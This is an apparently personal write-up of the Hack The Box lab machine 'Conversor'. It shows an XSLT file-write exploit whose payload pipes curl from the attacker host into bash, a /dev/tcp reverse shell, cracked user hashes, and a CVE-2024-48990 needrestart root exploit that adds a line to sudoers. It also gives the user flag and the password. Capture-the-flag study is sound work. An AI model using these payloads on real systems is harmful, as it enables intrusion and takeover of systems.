---
layout: default
title: "HTB: Conversor"
---


> **Machine:** Conversor

> **IP:** 10.10.11.92

> **Difficulty:** Medium



---

### [~] Enumeration:~#

Scanning the ip address with nmap reveals a standard Ubuntu web server setup.

```bash
> nmap 10.10.11.92 -sVC

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### [!] Web_Exploitation:~#
The application allows users to upload XML and XSLT files for conversion.
<img width="1501" height="761" alt="image" src="https://github.com/user-attachments/assets/aa2d5af6-7ccd-4eeb-9625-1facd8c38cf8" />

I exploited this by creating a malicious .xslt file that uses the EXSLT extension to write a Python reverse shell directly onto the server's script directory.

exploit.xslt:
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.81:8000/shell.sh|bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>
```

shell.sh
```#!/bin/bash                                     
bash -i >& /dev/tcp/10.10.14.81/9001 0>&1
```

### [#] Lateral_Movement:~#
Enumerating the web directory, I found a SQLite database `users.db`.
`sqlite3 users.db "select * from users;"`

I found the password hash for different users 
```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test32|098f6bcd4621d373cade4e832627b4f6
6|user|2c103f2c4ed1e59c0b4e2e01821770fa
7|mike|a39b7395d52317737402460bf71b3086
8|test|cc03e747a6afbbcbf8be7668acfebee5
9|test777|83560a75c016ee68f0dd71bf1bb35b84
10|zaza|8ba97607a1485ccdbe19745ed80cd52d
11|test1|098f6bcd4621d373cade4e832627b4f6
12|1|c4ca4238a0b923820dcc509a6f75849b
```

User `fismathack` stands out and I cracked the hash foer that user 
Cracking the MD5 hash revealed the password: `Keepmesafeandwarm`.This allowed SSH access as fismathack.
I then go the user flag from the home directory 

`ee60e29be186b90b58c5c9caf4a6ab09`

### Privilege_Escalation
Checking `sudo -l`, I found that I can run /usr/bin/needrestart as root. 
This version is vulnerable to CVE-2024–48990. Since the target didn't gcc, I compiled the exploit library locally and transferred it over to the machine.
lib.c script
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {  // Only execute if we're running with root privileges
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}
```
Then I compiled it with gcc

runner.sh script
```
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

#chage to your ip and open python http server
curl http://10.10.14.118:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

The next thing is to make runner.sh executable and run it. 
After executing runner.sh, we need to open another ssh window and execute sudo /usr/sbin/needrestart to obtain the root shell.
When we check back on the tab where we ran runner.sh script, we have gotten a root shell
```
fismathack@conversor:/dev/shm$ ./runner.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100 15520  100 15520    0     0  18298      0 --:--:-- --:--:-- --:--:-- 18301
id
Got shell!, delete traces in /tmp/poc, /tmp/malicious
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt  scripts
```
